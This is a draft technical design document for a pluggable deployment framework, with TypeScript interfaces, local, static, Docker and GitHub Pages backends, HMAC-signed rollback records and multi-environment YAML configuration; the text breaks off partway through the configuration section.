# TDD-023: Deployment Backend Framework Core

| Field        | Value                                              |
|--------------|---------------------------------------------------|
| **Title**    | Deployment Backend Framework Core                 |
| **TDD ID**   | TDD-023                                           |
| **Version**  | 1.0                                               |
| **Date**     | 2026-04-28                                        |
| **Status**   | Draft                                             |
| **Author**   | Patrick Watson                                    |
| **Parent PRD** | PRD-014: Deployment Backends Framework          |
| **Plugin**   | autonomous-dev                                    |

## 1. Summary

This TDD implements a comprehensive deployment backends framework that transforms autonomous-dev's stub deploy phase into a production-capable system supporting local development, static sites, containerized applications, and cloud services. The framework provides a pluggable interface where backends implement `build()`, `deploy()`, `healthCheck()`, and `rollback()` methods while the core handles environment selection, trust integration, cost tracking, and observability.

The system ships with four bundled backends (`local`, `static`, `docker-local`, `github-pages`) that enable immediate deployment capability without external dependencies, while providing extension hooks for cloud backends (`gcp`, `aws`, `azure`, `k8s`) distributed as separate plugins. Multi-environment support allows dev/staging/prod configurations with per-environment approval gates integrated with PRD-007's trust framework.

Key innovations include HMAC-signed deployment records for rollback integrity, server-side validated parameters preventing shell injection, cost cap enforcement with escalation, comprehensive observability with per-deploy log directories, and a conformance test suite ensuring all backends meet safety and reliability standards.

## 2. Goals & Non-Goals

### Goals
- Replace stub deploy phase with pluggable backend interface supporting diverse deployment targets
- Ship 4 bundled backends proving framework utility: `local`, `static`, `docker-local`, `github-pages`
- Support multi-environment deployment with trust-level approval gates and cost caps per environment
- Provide comprehensive deployment lifecycle: build → deploy → health → rollback → monitor
- Ensure full backward compatibility where existing repos continue working with `local` backend
- Enable cloud backend extensibility through separate plugin distribution model
- Integrate cost tracking, observability, and security measures for production deployment safety

### Non-Goals
- Not a CI/CD system replacement - assumes validated code from integration phase
- Not infrastructure provisioning - backends consume existing configured environments
- Not multi-cloud orchestration - each backend targets single environment type
- Not service mesh management - advanced networking handled by target environments
- Not comprehensive monitoring system - basic health checks only, external monitoring expected

## 3. Background

The current deploy phase is a placeholder that commits code and opens pull requests. While this satisfies the state machine requirement to transition from integration to deploy to monitor phases, it provides no actual deployment capability for real-world scenarios.

Real deployment requires:
- Building executable artifacts (containers, binaries, static sites)
- Deploying to target environments (local Docker, cloud services, Kubernetes)
- Health verification and automated rollback on failure
- Multi-environment support with appropriate approval gates
- Cost tracking and resource cleanup
- Security measures preventing injection attacks and unauthorized access

The solution is a backends framework with a uniform TypeScript interface that each backend implements, combined with a selection algorithm that routes deployments to appropriate backends based on repository configuration.

## 4. Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    Deploy Phase Integration                     │
│                                                                 │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────────┐ │
│  │ State       │    │ Config      │    │ Trust Gate          │ │
│  │ Machine     │───▶│ Loader      │───▶│ Evaluator           │ │
│  │ (TDD-002)   │    │             │    │ (PRD-007)           │ │
│  └─────────────┘    └─────────────┘    └─────────────────────┘ │
│                             │                       │           │
│                             ▼                       ▼           │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────────┐ │
│  │ Backend     │    │ Environment │    │ Cost Cap            │ │
│  │ Selector    │◀───│ Resolver    │    │ Enforcer            │ │
│  │             │    │             │    │                     │ │
│  └─────────────┘    └─────────────┘    └─────────────────────┘ │
│           │                                                     │
└───────────┼─────────────────────────────────────────────────────┘
            │
┌───────────▼─────────────────────────────────────────────────────┐
│                    Backend Framework                            │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │                Backend Interface                            │ │
│  │                                                             │ │
│  │  build(ctx) ──▶ deploy(artifact, env) ──▶ healthCheck()   │ │
│  │      │                    │                       │        │ │
│  │      ▼                    ▼                       ▼        │ │
│  │ BuildArtifact      DeploymentRecord           HealthStatus │ │
│  │                           │                                │ │
│  │                           ▼                                │ │
│  │                   HMAC-signed record                      │ │
│  │                   stored for rollback                     │ │
│  │                                                             │ │
│  │                    rollback(record)                       │ │
│  │                           │                                │ │
│  │                           ▼                                │ │
│  │                   RollbackResult                          │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                                                                 │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────┐ │
│  │   Bundled   │  │    Local    │  │   Static    │  │ Docker  │ │
│  │  Registry   │  │   Backend   │  │   Backend   │  │ Local   │ │
│  │             │  │             │  │             │  │ Backend │ │
│  │ • local     │  │ • git commit│  │ • rsync     │  │ • build │ │
│  │ • static    │  │ • create PR │  │ • ssh deploy│  │ • run   │ │
│  │ • docker-   │  │ • health:   │  │ • http ping │  │ • health│ │
│  │   local     │  │   always ok │  │ • rollback  │  │ • stop  │ │
│  │ • github-   │  │ • rollback: │  │   backup    │  │ • start │ │
│  │   pages     │  │   revert PR │  │             │  │ prev    │ │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────┘ │
│                                                                 │
│  ┌─────────────┐                                               │ │
│  │   Cloud     │  [Extension point for TDD-024]              │ │
│  │  Backends   │                                               │ │
│  │             │  • gcp      • aws      • azure    • k8s      │ │
│  │ (Plugins)   │  • Separate plugin distribution              │ │
│  │             │  • CredentialProxy integration               │ │
│  └─────────────┘                                               │ │
└─────────────────────────────────────────────────────────────────┘
            │
┌───────────▼─────────────────────────────────────────────────────┐
│                   Target Environments                          │
│                                                                 │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────┐ │
│  │ Git Repos   │  │ Web Servers │  │ Local       │  │ Cloud   │ │
│  │             │  │             │  │ Containers  │  │Services │ │
│  │ • branches  │  │ • static    │  │             │  │         │ │
│  │ • pull      │  │   files     │  │ • docker    │  │ • future│ │
│  │   requests  │  │ • rsync     │  │   daemon    │  │   cloud │ │
│  │             │  │ • ssh       │  │ • localhost │  │   deploy│ │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

The architecture separates concerns: the deploy phase integration handles state machine transitions and trust evaluation, the backend framework provides the pluggable interface and common services, bundled backends implement specific deployment types, and cloud backends extend the framework through plugins.

## 5. DeploymentBackend Interface

### 5.1 Core Interface Definition

```typescript
/**
 * Core backend interface that all deployment backends must implement.
 * Backends are responsible for building artifacts, deploying to target
 * environments, verifying health, and rolling back on failure.
 */
interface DeploymentBackend {
  /** Unique identifier for this backend type */
  readonly name: string;
  
  /** Backend capability declarations for validation and UI */
  readonly capabilities: BackendCapabilities;
  
  /** Cost model for governance integration */
  readonly costModel: 'free' | 'pay-per-build' | 'pay-per-runtime' | 'custom';

  /**
   * Build phase: Convert repository code into deployable artifact
   * Must be idempotent - same context produces same artifact
   * Content-addressed artifacts enable caching and integrity verification
   */
  build(context: BuildContext): Promise<BuildArtifact>;

  /**
   * Deploy phase: Deploy artifact to target environment
   * Must be idempotent - same artifact + env produces same result
   * Returns signed deployment record for rollback capability
   */
  deploy(artifact: BuildArtifact, env: TargetEnvironment): Promise<DeploymentRecord>;

  /**
   * Health check: Verify deployment is functional
   * Must be read-only - no side effects
   * Used for automated rollback decisions
   */
  healthCheck(deployment: DeploymentRecord): Promise<HealthStatus>;

  /**
   * Rollback: Revert to previous stable state
   * Uses HMAC-signed deployment record to prevent tampering
   * Must complete within deployment timeout period
   */
  rollback(deployment: DeploymentRecord): Promise<RollbackResult>;

  /**
   * Optional monitoring: Long-lived observability handle
   * Returns closeable stream for logs/metrics integration
   */
  monitor?(deployment: DeploymentRecord): Promise<MonitorHandle>;

  /**
   * Configuration validation: Check backend-specific settings
   * Called during daemon startup and config reload
   */
  validateConfig?(config: EnvironmentConfig): Promise<ConfigValidationResult>;

  /**
   * Resource cleanup: Remove deployment artifacts on failure
   * Prevents resource leaks and unexpected costs
   */
  cleanup?(deployment: DeploymentRecord): Promise<void>;
}

/**
 * Backend capability declarations for framework validation
 */
interface BackendCapabilities {
  supportsRollback: boolean;
  supportsMonitoring: boolean;
  supportsMultipleEnvironments: boolean;
  requiresCredentials: boolean;
  supportedProjectTypes: ProjectLanguage[];
  estimatedLatency: {
    buildSeconds: number;
    deploySeconds: number;
    healthCheckSeconds: number;
  };
}

/**
 * Validated build parameters prevent shell injection attacks
 * All values pass through server-side validation before reaching backends
 */
interface ValidatedParameters {
  [key: string]: string | number | boolean;
}

/**
 * Build context provides all information needed for artifact creation
 */
interface BuildContext {
  requestId: string;
  repositoryPath: string;
  targetEnvironment: TargetEnvironment;
  gitCommitSha: string;
  detectedLanguage?: ProjectLanguage;
  detectedFramework?: string;
  parameters: ValidatedParameters; // Server-side validated per §20.2
  environmentConfig: EnvironmentConfig;
  costLimitUsd?: number;
}

/**
 * Content-addressed build artifact with integrity verification
 */
interface BuildArtifact {
  artifactId: string; // Content-addressed identifier
  contentHash: string; // SHA-256 for integrity verification
  createdAt: string; // ISO 8601 timestamp
  buildDurationMs: number;
  artifactSizeBytes: number;
  artifactPath: string; // Local filesystem path
  metadata: Record<string, any>; // Backend-specific data
  dependencies?: string[]; // For vulnerability scanning
}

/**
 * HMAC-signed deployment record prevents rollback tampering
 * Signature verified before any rollback operation (§20.3)
 */
interface DeploymentRecord {
  deploymentId: string; // DEP-{request-id}-{environment}-{timestamp}
  requestId: string;
  environment: string;
  artifactId: string;
  backend: string;
  deployedAt: string; // ISO 8601
  deployedEndpoint?: string; // URL if applicable
  rollbackData: Record<string, any>; // Backend-specific rollback info
  cost?: number; // Actual deployment cost in USD
  status: 'deploying' | 'healthy' | 'degraded' | 'failed' | 'rolled-back';
  signature: string; // HMAC-SHA256 signature for integrity
}

interface HealthStatus {
  healthy: boolean;
  checkType: string; // "http", "container", "custom"
  responseTimeMs?: number;
  endpoint?: string;
  details?: string;
  degradedReasons?: string[];
  timestamp: string; // ISO 8601
}

interface RollbackResult {
  success: boolean;
  rolledBackTo?: string; // Previous deployment ID
  error?: string;
  rollbackDurationMs?: number;
  newStatus: 'healthy' | 'failed' | 'unknown';
}

interface MonitorHandle {
  deploymentId: string;
  close(): Promise<void>;
  getLogs(): AsyncIterable<string>;
  getMetrics?(): Promise<Record<string, number>>;
  onStatusChange?(callback: (status: HealthStatus) => void): void;
}
```

### 5.2 Lifecycle State Machine

Each deployment follows a deterministic state machine:

```
[build] ──▶ [deploy] ──▶ [health_check] ──▶ [healthy]
   │           │              │                │
   ▼           ▼              ▼                ▼
[failed]   [failed]      [unhealthy]      [monitor]
   │           │              │                │
   ▼           ▼              ▼                ▼
[cleanup]  [cleanup]    [rollback] ──▶ [rolled_back]
   │           │              │                │
   ▼           ▼              ▼                ▼
[complete] [complete]   [complete]     [complete]
```

State transitions are logged to both daemon log and per-deployment log files for full auditability.

## 6. Bundled Backends

### 6.1 Local Backend (Backward Compatibility)

**Purpose**: Preserve exact current behavior for repositories without deployment configuration.

**Implementation**:
```typescript
class LocalBackend implements DeploymentBackend {
  readonly name = 'local';
  readonly capabilities = {
    supportsRollback: true,
    supportsMonitoring: false,
    supportsMultipleEnvironments: false,
    requiresCredentials: false,
    supportedProjectTypes: ['any'],
    estimatedLatency: { buildSeconds: 0, deploySeconds: 30, healthCheckSeconds: 1 }
  };
  readonly costModel = 'free';

  async build(context: BuildContext): Promise<BuildArtifact> {
    // No-op build - git commit is the "artifact"
    return {
      artifactId: `git-${context.gitCommitSha}`,
      contentHash: context.gitCommitSha,
      createdAt: new Date().toISOString(),
      buildDurationMs: 0,
      artifactSizeBytes: 0,
      artifactPath: context.repositoryPath,
      metadata: { type: 'git-commit', sha: context.gitCommitSha }
    };
  }

  async deploy(artifact: BuildArtifact, env: TargetEnvironment): Promise<DeploymentRecord> {
    // Execute current behavior: commit changes and create PR
    const branchName = `auto/${env.config.requestId}/deploy-${Date.now()}`;
    await this.createBranch(branchName, artifact.metadata.sha);
    await this.commitChanges(branchName);
    const prUrl = await this.createPullRequest(branchName);
    
    return this.signRecord({
      deploymentId: `DEP-${env.config.requestId}-${env.name}-${Date.now()}`,
      requestId: env.config.requestId,
      environment: env.name,
      artifactId: artifact.artifactId,
      backend: 'local',
      deployedAt: new Date().toISOString(),
      deployedEndpoint: prUrl,
      rollbackData: { branchName, prUrl },
      status: 'healthy'
    });
  }

  async healthCheck(deployment: DeploymentRecord): Promise<HealthStatus> {
    // Always healthy if PR exists
    const prExists = await this.checkPullRequestExists(deployment.rollbackData.prUrl);
    return {
      healthy: prExists,
      checkType: 'git-pr',
      details: prExists ? 'Pull request exists' : 'Pull request not found',
      timestamp: new Date().toISOString()
    };
  }

  async rollback(deployment: DeploymentRecord): Promise<RollbackResult> {
    // Verify signature before rollback
    if (!this.verifySignature(deployment)) {
      throw new Error('Deployment record signature verification failed');
    }
    
    // Close PR and delete branch
    await this.closePullRequest(deployment.rollbackData.prUrl);
    await this.deleteBranch(deployment.rollbackData.branchName);
    
    return {
      success: true,
      rollbackDurationMs: 5000,
      newStatus: 'healthy'
    };
  }
}
```

### 6.2 Static Backend (Web Server Deployment)

**Purpose**: Deploy static sites and documentation via rsync to configured hosts.

**Configuration Schema**:
```yaml
static:
  target_host: "web.example.com"
  target_path: "/var/www/html/"
  ssh_key_path: "~/.ssh/deploy_key"
  ssh_user: "deploy"
  build_command: "npm run build"  # Optional
  health_check_url: "https://web.example.com/health"
  backup_retention_hours: 24
```

**Implementation highlights**:
- Detects static site generators (Jekyll, Hugo, Next.js, Gatsby) automatically
- Runs build command or uses detected build script
- Creates timestamped backup of current deployment before rsync
- HTTP GET health check to verify deployed content
- Rollback restores previous backup via rsync

### 6.3 Docker-Local Backend (Full Implementation)

**Purpose**: Build and run containers locally for development and testing.

**Configuration Schema**:
```yaml
docker-local:
  dockerfile_path: "./Dockerfile"  # Auto-detect if not specified
  ports: ["3000:3000", "8080:8080"]
  environment_vars:
    NODE_ENV: "development"
    DEBUG: "true"
  registry: "localhost:5000"  # Optional local registry
  container_name_prefix: "autonomous-dev"
  memory_limit: "512m"
  cpu_limit: "1"
  health_check:
    endpoint: "/health"
    timeout_seconds: 30
    retries: 3
```

**Full Implementation**:
```typescript
class DockerLocalBackend implements DeploymentBackend {
  readonly name = 'docker-local';
  readonly capabilities = {
    supportsRollback: true,
    supportsMonitoring: true,
    supportsMultipleEnvironments: true,
    requiresCredentials: false,
    supportedProjectTypes: ['javascript', 'python', 'go', 'java', 'rust'],
    estimatedLatency: { buildSeconds: 120, deploySeconds: 30, healthCheckSeconds: 10 }
  };
  readonly costModel = 'free';

  async build(context: BuildContext): Promise<BuildArtifact> {
    const config = context.environmentConfig.settings['docker-local'];
    const dockerfilePath = this.resolveDockerfile(context.repositoryPath, config.dockerfile_path);
    
    // Content-addressed image tag based on Dockerfile + source hash
    const sourceHash = await this.hashDirectory(context.repositoryPath);
    const dockerfileHash = await this.hashFile(dockerfilePath);
    const contentHash = crypto.createHash('sha256')
      .update(sourceHash + dockerfileHash)
      .digest('hex').substring(0, 16);
    
    const imageName = `${config.container_name_prefix || 'autonomous-dev'}:${contentHash}`;
    
    // Check if image already exists (caching)
    if (await this.imageExists(imageName)) {
      return {
        artifactId: imageName,
        contentHash,
        createdAt: new Date().toISOString(),
        buildDurationMs: 0, // Cache hit
        artifactSizeBytes: await this.getImageSize(imageName),
        artifactPath: imageName,
        metadata: { cached: true, imageName }
      };
    }

    const buildStart = Date.now();
    
    // Build with resource limits and timeout
    const buildArgs = [
      'build',
      '--file', dockerfilePath,
      '--tag', imageName,
      '--memory', config.memory_limit || '512m',
      '--cpu-quota', this.calculateCpuQuota(config.cpu_limit || '1'),
      context.repositoryPath
    ];
    
    const result = await this.execWithTimeout('docker', buildArgs, {
      timeoutMs: 600000, // 10 minutes
      stdio: ['pipe', 'pipe', 'pipe']
    });
    
    if (result.exitCode !== 0) {
      throw new Error(`Docker build failed: ${result.stderr}`);
    }

    const buildDuration = Date.now() - buildStart;
    const imageSize = await this.getImageSize(imageName);

    return {
      artifactId: imageName,
      contentHash,
      createdAt: new Date().toISOString(),
      buildDurationMs: buildDuration,
      artifactSizeBytes: imageSize,
      artifactPath: imageName,
      metadata: { 
        cached: false, 
        imageName, 
        buildOutput: result.stdout,
        dockerfileHash 
      }
    };
  }

  async deploy(artifact: BuildArtifact, env: TargetEnvironment): Promise<DeploymentRecord> {
    const config = env.config.settings['docker-local'];
    const containerName = `${config.container_name_prefix || 'autonomous-dev'}-${env.name}-${Date.now()}`;
    
    // Stop existing container if running
    await this.stopPreviousContainer(env.name);
    
    const runArgs = [
      'run',
      '--detach',
      '--name', containerName,
      '--restart', 'unless-stopped'
    ];
    
    // Add port mappings
    if (config.ports) {
      for (const port of config.ports) {
        runArgs.push('--publish', port);
      }
    }
    
    // Add environment variables
    if (config.environment_vars) {
      for (const [key, value] of Object.entries(config.environment_vars)) {
        runArgs.push('--env', `${key}=${value}`);
      }
    }
    
    // Add resource limits
    if (config.memory_limit) {
      runArgs.push('--memory', config.memory_limit);
    }
    if (config.cpu_limit) {
      runArgs.push('--cpus', config.cpu_limit);
    }
    
    runArgs.push(artifact.artifactId);
    
    const result = await this.execWithTimeout('docker', runArgs, {
      timeoutMs: 60000 // 1 minute
    });
    
    if (result.exitCode !== 0) {
      throw new Error(`Docker run failed: ${result.stderr}`);
    }
    
    const containerId = result.stdout.trim();
    
    // Get container endpoint
    const endpoint = await this.getContainerEndpoint(containerId, config.ports?.[0]);

    return this.signRecord({
      deploymentId: `DEP-${env.config.requestId}-${env.name}-${Date.now()}`,
      requestId: env.config.requestId,
      environment: env.name,
      artifactId: artifact.artifactId,
      backend: 'docker-local',
      deployedAt: new Date().toISOString(),
      deployedEndpoint: endpoint,
      rollbackData: {
        containerId,
        containerName,
        imageName: artifact.artifactId,
        previousContainer: await this.getPreviousContainerName(env.name)
      },
      status: 'deploying'
    });
  }

  async healthCheck(deployment: DeploymentRecord): Promise<HealthStatus> {
    const config = this.getHealthCheckConfig(deployment);
    const containerId = deployment.rollbackData.containerId;
    
    // Check container status
    const containerStatus = await this.getContainerStatus(containerId);
    if (containerStatus !== 'running') {
      return {
        healthy: false,
        checkType: 'container',
        details: `Container status: ${containerStatus}`,
        timestamp: new Date().toISOString()
      };
    }
    
    // HTTP health check if endpoint configured
    if (config.health_check?.endpoint && deployment.deployedEndpoint) {
      const healthUrl = `${deployment.deployedEndpoint}${config.health_check.endpoint}`;
      const startTime = Date.now();
      
      try {
        const response = await fetch(healthUrl, {
          timeout: config.health_check.timeout_seconds * 1000 || 30000
        });
        
        const responseTime = Date.now() - startTime;
        const healthy = response.ok;
        
        return {
          healthy,
          checkType: 'http',
          responseTimeMs: responseTime,
          endpoint: healthUrl,
          details: healthy ? `HTTP ${response.status}` : `HTTP ${response.status}: ${response.statusText}`,
          timestamp: new Date().toISOString()
        };
      } catch (error) {
        return {
          healthy: false,
          checkType: 'http',
          endpoint: healthUrl,
          details: `Health check failed: ${error.message}`,
          timestamp: new Date().toISOString()
        };
      }
    }
    
    // Container running = healthy
    return {
      healthy: true,
      checkType: 'container',
      details: 'Container running',
      timestamp: new Date().toISOString()
    };
  }

  async rollback(deployment: DeploymentRecord): Promise<RollbackResult> {
    if (!this.verifySignature(deployment)) {
      throw new Error('Deployment record signature verification failed');
    }
    
    const rollbackStart = Date.now();
    const { containerId, previousContainer } = deployment.rollbackData;
    
    try {
      // Stop current container
      await this.execWithTimeout('docker', ['stop', containerId], { timeoutMs: 30000 });
      await this.execWithTimeout('docker', ['rm', containerId], { timeoutMs: 10000 });
      
      // Start previous container if it exists
      if (previousContainer) {
        await this.execWithTimeout('docker', ['start', previousContainer], { timeoutMs: 30000 });
        
        // Verify rollback health
        const health = await this.healthCheck({
          ...deployment,
          rollbackData: { containerId: previousContainer }
        });
        
        return {
          success: health.healthy,
          rolledBackTo: previousContainer,
          rollbackDurationMs: Date.now() - rollbackStart,
          newStatus: health.healthy ? 'healthy' : 'failed'
        };
      }
      
      return {
        success: true,
        rollbackDurationMs: Date.now() - rollbackStart,
        newStatus: 'unknown'
      };
    } catch (error) {
      return {
        success: false,
        error: error.message,
        rollbackDurationMs: Date.now() - rollbackStart,
        newStatus: 'failed'
      };
    }
  }

  async monitor(deployment: DeploymentRecord): Promise<MonitorHandle> {
    const containerId = deployment.rollbackData.containerId;
    
    return {
      deploymentId: deployment.deploymentId,
      
      async close() {
        // Nothing to clean up for docker logs
      },
      
      async *getLogs() {
        const logsProcess = spawn('docker', ['logs', '--follow', '--timestamps', containerId]);
        
        for await (const line of this.streamLines(logsProcess.stdout)) {
          yield line;
        }
      },
      
      async getMetrics() {
        const statsOutput = await this.execWithTimeout('docker', [
          'stats', '--no-stream', '--format', 'json', containerId
        ], { timeoutMs: 10000 });
        
        if (statsOutput.exitCode === 0) {
          const stats = JSON.parse(statsOutput.stdout);
          return {
            cpuPercent: parseFloat(stats.CPUPerc.replace('%', '')),
            memoryUsageMB: this.parseMemoryBytes(stats.MemUsage) / (1024 * 1024),
            memoryPercent: parseFloat(stats.MemPerc.replace('%', '')),
            networkRxMB: this.parseNetworkBytes(stats.NetIO, 'rx') / (1024 * 1024),
            networkTxMB: this.parseNetworkBytes(stats.NetIO, 'tx') / (1024 * 1024)
          };
        }
        
        return {};
      }
    };
  }
}
```

### 6.4 GitHub Pages Backend

**Purpose**: Deploy documentation and static sites to GitHub Pages.

**Configuration Schema**:
```yaml
github-pages:
  repository: "owner/repo"  # Auto-detected from git remote
  branch: "gh-pages"        # Target branch
  custom_domain: "docs.example.com"  # Optional CNAME
  build_command: "npm run docs"       # Optional
  commit_message_template: "Deploy from {commit_sha} via autonomous-dev"
```

**Implementation highlights**:
- Builds static content using detected or configured build command
- Pushes to `gh-pages` branch using GitHub API with authentication
- Verifies deployment via github.io URL health check
- Rollback reverts `gh-pages` branch to previous commit
- Supports custom domain CNAME configuration

## 7. Build Context & Parameters

### 7.1 Validated Parameters System

To prevent shell injection attacks (§20.2), all deployment parameters pass through server-side validation before reaching backends:

```typescript
interface ParameterValidator {
  /** Parameter name for configuration reference */
  name: string;
  
  /** Data type validation */
  type: 'string' | 'number' | 'boolean' | 'array';
  
  /** Regex pattern for string validation */
  pattern?: string;
  
  /** Minimum/maximum for numeric values */
  min?: number;
  max?: number;
  
  /** Allowed values enumeration */
  allowedValues?: (string | number)[];
  
  /** Whether parameter is required */
  required: boolean;
  
  /** Default value if not provided */
  defaultValue?: any;
}

// Example validators for common parameters
const COMMON_VALIDATORS: ParameterValidator[] = [
  {
    name: 'gcp_project_id',
    type: 'string',
    pattern: '^[a-z][a-z0-9-]{4,28}[a-z0-9]$',
    required: true
  },
  {
    name: 'docker_registry',
    type: 'string', 
    pattern: '^[a-zA-Z0-9.-]+:[0-9]+$',
    required: false,
    defaultValue: 'localhost:5000'
  },
  {
    name: 'memory_limit_mb',
    type: 'number',
    min: 128,
    max: 8192,
    required: false,
    defaultValue: 512
  },
  {
    name: 'environment_type',
    type: 'string',
    allowedValues: ['dev', 'staging', 'prod'],
    required: true
  }
];

class ParameterValidationService {
  validateParameters(raw: Record<string, any>, validators: ParameterValidator[]): ValidatedParameters {
    const result: ValidatedParameters = {};
    
    for (const validator of validators) {
      const value = raw[validator.name];
      
      if (value === undefined || value === null) {
        if (validator.required) {
          throw new ValidationError(`Required parameter '${validator.name}' is missing`);
        }
        if (validator.defaultValue !== undefined) {
          result[validator.name] = validator.defaultValue;
        }
        continue;
      }
      
      // Type validation
      const actualType = Array.isArray(value) ? 'array' : typeof value;
      if (actualType !== validator.type) {
        throw new ValidationError(`Parameter '${validator.name}' must be ${validator.type}, got ${actualType}`);
      }
      
      // Pattern validation for strings
      if (validator.type === 'string' && validator.pattern) {
        if (!new RegExp(validator.pattern).test(value as string)) {
          throw new ValidationError(`Parameter '${validator.name}' does not match required pattern`);
        }
      }
      
      // Range validation for numbers
      if (validator.type === 'number') {
        const num = value as number;
        if (validator.min !== undefined && num < validator.min) {
          throw new ValidationError(`Parameter '${validator.name}' must be >= ${validator.min}`);
        }
        if (validator.max !== undefined && num > validator.max) {
          throw new ValidationError(`Parameter '${validator.name}' must be <= ${validator.max}`);
        }
      }
      
      // Enumeration validation
      if (validator.allowedValues && !validator.allowedValues.includes(value)) {
        throw new ValidationError(`Parameter '${validator.name}' must be one of: ${validator.allowedValues.join(', ')}`);
      }
      
      result[validator.name] = value;
    }
    
    return result;
  }
}
```

### 7.2 Build Context Assembly

```typescript
interface BuildContextAssembler {
  assembleBuildContext(
    requestId: string,
    repositoryPath: string,
    targetEnv: TargetEnvironment,
    gitCommitSha: string
  ): BuildContext;
}

class BuildContextAssemblerImpl implements BuildContextAssembler {
  constructor(
    private projectDetector: ProjectDetectionService,
    private parameterValidator: ParameterValidationService
  ) {}

  assembleBuildContext(
    requestId: string,
    repositoryPath: string,
    targetEnv: TargetEnvironment,
    gitCommitSha: string
  ): BuildContext {
    // Detect project type and framework
    const detection = this.projectDetector.detect(repositoryPath);
    
    // Get backend-specific validators
    const backend = BackendRegistry.getBackend(targetEnv.backendType);
    const validators = backend.getParameterValidators?.() || [];
    
    // Validate parameters against backend requirements
    const rawParams = targetEnv.config.settings[targetEnv.backendType] || {};
    const validatedParams = this.parameterValidator.validateParameters(rawParams, validators);
    
    return {
      requestId,
      repositoryPath,
      targetEnvironment: targetEnv,
      gitCommitSha,
      detectedLanguage: detection.language,
      detectedFramework: detection.framework,
      parameters: validatedParams,
      environmentConfig: targetEnv.config,
      costLimitUsd: targetEnv.config.costCap
    };
  }
}
```

## 8. Deployment Record Schema

### 8.1 HMAC Signature Implementation

HMAC-signed deployment records prevent tampering with rollback data (§20.3):

```typescript
interface DeploymentRecordSigner {
  signRecord(record: Omit<DeploymentRecord, 'signature'>): DeploymentRecord;
  verifySignature(record: DeploymentRecord): boolean;
}

class HMACDeploymentRecordSigner implements DeploymentRecordSigner {
  constructor(private secretKey: string) {}

  signRecord(record: Omit<DeploymentRecord, 'signature'>): DeploymentRecord {
    const canonicalPayload = this.canonicalize(record);
    const signature = crypto
      .createHmac('sha256', this.secretKey)
      .update(canonicalPayload)
      .digest('hex');
    
    return {
      ...record,
      signature: `hmac-sha256:${signature}`
    };
  }

  verifySignature(record: DeploymentRecord): boolean {
    const { signature, ...payload } = record;
    
    if (!signature.startsWith('hmac-sha256:')) {
      return false;
    }
    
    const expectedSignature = signature;
    const recomputedRecord = this.signRecord(payload);
    
    // Constant-time comparison to prevent timing attacks
    return crypto.timingSafeEqual(
      Buffer.from(expectedSignature),
      Buffer.from(recomputedRecord.signature)
    );
  }

  private canonicalize(record: Omit<DeploymentRecord, 'signature'>): string {
    // Deterministic JSON serialization for consistent signing
    const sorted = JSON.stringify(record, Object.keys(record).sort());
    return sorted;
  }
}

// Example deployment record with signature
const exampleRecord: DeploymentRecord = {
  deploymentId: "DEP-REQ-ABC123-dev-1714285200000",
  requestId: "REQ-ABC123",
  environment: "dev",
  artifactId: "docker-image:sha256:abc123...",
  backend: "docker-local",
  deployedAt: "2026-04-28T10:00:00Z",
  deployedEndpoint: "http://localhost:3000",
  rollbackData: {
    containerId: "container_abc123",
    containerName: "autonomous-dev-dev-1714285200000",
    imageName: "autonomous-dev:abc123",
    previousContainer: "autonomous-dev-dev-1714281600000"
  },
  cost: 0,
  status: "healthy",
  signature: "hmac-sha256:a1b2c3d4e5f6..." // 64-character hex
};
```

### 8.2 Record Persistence and Integrity

Deployment records are stored in per-deployment directories with integrity verification:

```
<repo>/.autonomous-dev/deploys/
  DEP-REQ-ABC123-dev-1714285200000/
    deployment.json          # Signed deployment record
    deployment.json.backup   # Previous version for rollback
    build.log               # Build phase logs
    deploy.log              # Deploy phase logs
    health.log              # Health check logs
    rollback.log            # Rollback logs (if applicable)
    artifacts/              # Artifact metadata and small files
      metadata.json
      checksums.txt
```

Records are retained for the configured rollback window (default 24 hours) then archived.

## 9. Multi-Environment Configuration

### 9.1 Configuration Schema

Repository deployment configuration at `.autonomous-dev/deploy.yaml`:

```yaml
# Schema version for backward compatibility
schema_version: "1.0"

# Global deployment metadata
metadata:
  default_environment: "dev"
  git_base_branch: "main"
  artifact_retention_days: 30

# Environment definitions with inheritance
environments:
  # Development environment - local containers
  dev:
    backend: "docker-local"
    auto_deploy: true
    approval_required: false
    cost_cap_usd: 10
    trust_level_override: 2  # Can deploy autonomously at L2+
    
    settings:
      docker-local:
        dockerfile_path: "./Dockerfile.dev"
        ports: ["3000:3000", "5432:5432"]
        environment_vars:
          NODE_ENV: "development"
          DEBUG: "autonomous-dev:*"
          DATABASE_URL: "postgresql://dev:dev@localhost:5432/dev"
        memory_limit: "512m"
        health_check:
          endpoint: "/health"
          timeout_seconds: 30
          retries: 3
    
    timeouts:
      build: 300      # 5 minutes
      deploy: 120     # 2 minutes  
      health_check: 60 # 1 minute

  # Staging environment - inherits dev, overrides backend
  staging:
    inherits: "dev"  # Inherit all dev settings
    backend: "static" # Override backend
    auto_deploy: false # Require approval
    cost_cap_usd: 100
    trust_level_override: 1  # Requires approval at L0-L1
    
    settings:
      static:
        target_host: "staging.example.com"
        target_path: "/var/www/staging/"
        ssh_user: "deploy"
        ssh_key_path: "~/.ssh/staging_deploy_key"
        build_command: "npm run build:staging"
        health_check_url: "https://staging.example.com/health"
        backup_retention_hours: 48
    
    timeouts:
      build: 600      # 10 minutes for staging builds
      deploy: 300     # 5 minutes for network deploy
      health_check: 120 # 2 minutes for external health check

  # Production environment - always requires approval
  prod:
    inherits: "staging"
    backend: "github-pages" # Documentation site
    approval_required: true # Always require approval regardless of trust
    cost_cap_usd: 500
    trust_level_override: null # No override - use global trust rules
    
    settings:
      github-pages:
        repository: "company/product-docs" # Override auto-detection
        branch: "gh-pages"
        custom_domain: "docs.product.company.com"
        build_command: "npm run docs:build"
        commit_message_template: "Deploy docs from {commit_sha} - {request_id}"
    
    timeouts:
      build: 900      # 15 minutes for full doc build
      deploy: 600     # 10 minutes for GitHub Pages propagation
      health_check: 300 # 5 minutes for DNS propagation

# Global build settings
build:
